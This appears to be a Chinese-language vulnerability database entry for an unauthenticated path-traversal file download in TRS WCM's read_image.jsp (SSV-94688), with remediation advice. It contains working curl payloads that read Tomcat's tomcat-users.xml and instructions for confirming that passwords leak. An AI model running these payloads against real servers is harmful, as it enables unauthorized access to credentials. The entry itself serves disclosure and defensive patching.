---
id: TRS-WCM-READ_IMAGE-DOWNLOAD
title: TRS WCM read_image.jsp 任意文件下载漏洞（SSV-94688）
product: trs-wcm
vendor: 北京拓尔思信息技术股份有限公司
version_affected: "WCM 5.x/6.x（公开记录未限定精确子版本）"
severity: HIGH
tags: [file_read, 任意文件下载, 无需认证, 国产]
fingerprint: ["TRS WCM", "wcm", "拓尔思"]
---

## 漏洞描述

TRS WCM 的 `wcm/app/system/read_image.jsp`（读取上传图片功能）直接获取 `FileName` 参数且未做任何过滤与路径校验，攻击者可构造 `../`（或 Windows 下 `..\`）跳转路径下载服务器任意文件，例如 Tomcat 的 `conf/tomcat-users.xml` 等配置文件。

## 影响版本

- TRS WCM 5.x / 6.x（Seebug SSV-94688 记录，未限定精确版本）

## 前置条件

- 无需认证
- 目标 WCM 部署在 `/wcm/` 路径

## 利用步骤

1. 直接请求 `wcm/app/system/read_image.jsp`，在 `FileName` 参数中传入相对/绝对路径
2. 使用 `../` 或 `..\` 跳出 WCM 目录，读取 Tomcat 配置文件等敏感文件

## Payload

```bash
# 读取 Tomcat 用户配置文件（路径以实际部署为准）
curl -s "http://target/wcm/app/system/read_image.jsp?FileName=../conf/tomcat-users.xml"

# Windows 部署示例
curl -s "http://target/wcm/app/system/read_image.jsp?FileName=..\\..\\..\\conf\\tomcat-users.xml"
```

## 验证方法

- 响应内容包含目标文件内容（如 tomcat-users.xml 的 `<user ... password=.../>` 配置）
- 尝试读取 `web.xml` 等配置文件确认文件遍历是否生效

## 修复建议

1. 对 `FileName` 参数做规范化与路径校验，禁止 `../`、`..\`、绝对路径
2. 升级/应用厂商修复补丁
3. 对 `/wcm/app/system/read_image.jsp` 增加访问控制

## 参考

- Seebug SSV-94688（TRS 系统任意文件下载漏洞）
- TRS WCM 几处突破点: https://blog.csdn.net/HundredBai/article/details/50242969

> 产品线说明：本条目仅针对 TRS WCM 内容协作平台，与「TRS 媒资管理系统」（Vuln/web/trs/TRS-TEST-RCE.md）是不同产品线，不可相互改名或加 alias。
